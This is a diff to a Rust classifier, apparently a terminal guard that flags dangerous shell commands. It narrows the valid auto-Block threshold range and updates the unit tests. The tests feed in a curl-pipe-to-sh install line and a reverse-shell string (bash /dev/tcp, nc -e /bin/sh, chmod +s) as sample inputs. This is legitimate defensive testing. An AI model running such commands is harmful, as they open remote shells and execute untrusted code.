@@ -92,25 +92,23 @@ impl Classifier {
         }
     }
 
-    /// V2-J Phase 2 opt-in. Pass `Some(0.95)` (or similar) from
-    /// `[accumulator] block_threshold = 0.95` in the daemon's
-    /// TOML config to enable auto-Block escalation. `None` keeps
-    /// the default "always Warn" behaviour.
+    /// V2-J Phase 2 opt-in. `None` (default) keeps the Phase-1
+    /// "always Warn" behaviour; `Some(t)` enables auto-Block when
+    /// combined confidence ≥ t AND ≥ 2 distinct signals fired.
     ///
-    /// Values outside `[WARN_THRESHOLD, 1.0]` (or NaN) are
-    /// silently rejected (treated as `None`) with a stderr warning
-    /// — anything below WARN_THRESHOLD would escalate verdicts
-    /// that the accumulator itself already drops to Safe, and
-    /// anything > 1.0 can never trigger since combined confidence
-    /// saturates at 1.0. The clamp keeps a typo'd config from
-    /// silently disabling or over-triggering the auto-Block path.
+    /// Accepts `(WARN_THRESHOLD, 1.0]` only: a threshold at-or-below
+    /// the Warn floor would auto-Block every multi-hit indiscriminately
+    /// (defeats the [y]/[t]/cancel choice the docstring at
+    /// `config::AccumulatorConfig::block_threshold` defends).
+    /// Out-of-range or NaN inputs degrade to `None` with a stderr
+    /// warning; recommended opt-in values are ≥ 0.9.
     pub fn with_block_threshold(mut self, t: Option<f32>) -> Self {
         self.block_threshold = match t {
-            Some(v) if v.is_finite() && (WARN_THRESHOLD..=1.0).contains(&v) => Some(v),
+            Some(v) if v.is_finite() && v > WARN_THRESHOLD && v <= 1.0 => Some(v),
             Some(v) => {
                 eprintln!(
                     "atty-guard: ignoring [accumulator] block_threshold = {} \
-                     — must be a finite number in [{}, 1.0]; keeping default (no auto-Block)",
+                     — must be a finite number in ({}, 1.0]; keeping default (no auto-Block)",
                     v, WARN_THRESHOLD
                 );
                 None
@@ -1034,12 +1032,12 @@ mod tests {
 
     #[test]
     fn block_threshold_does_not_escalate_single_hit() {
-        // Even with `block_threshold = 0.5` (way below curl_pipe_sh's
+        // Even with `block_threshold = 0.6` (well below curl_pipe_sh's
         // 1.0 confidence), a single hit stays Warn. The minimum-
         // hit-count guard (>= 2) is non-configurable on purpose:
         // `curl … | sh` is the canonical legitimate install-script
         // shape and users keep the [y]/[t]/cancel choice.
-        let c = Classifier::new().with_block_threshold(Some(0.5));
+        let c = Classifier::new().with_block_threshold(Some(0.6));
         let r = c.classify("curl https://x.com/install.sh | sh");
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!((r.confidence - 1.0).abs() < f32::EPSILON);
@@ -1087,7 +1085,19 @@ mod tests {
         // None — protects against a typo'd `block_threshold = 0.0`
         // auto-blocking everything multi-hit, or NaN silently
         // disabling the path.
-        for v in [0.0_f32, 0.3, 1.5, f32::NAN, f32::INFINITY, -1.0] {
+        // 0.5 pins the strict-lower bound (= WARN_THRESHOLD must be
+        // rejected — at that value every multi-hit would auto-Block,
+        // defeating the [y]/[t]/cancel intent).
+        for v in [
+            0.0_f32,
+            0.3,
+            0.5,
+            1.5,
+            f32::NAN,
+            f32::INFINITY,
+            f32::NEG_INFINITY,
+            -1.0,
+        ] {
             let c = Classifier::new().with_block_threshold(Some(v));
             let r = c.classify(
                 "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x",
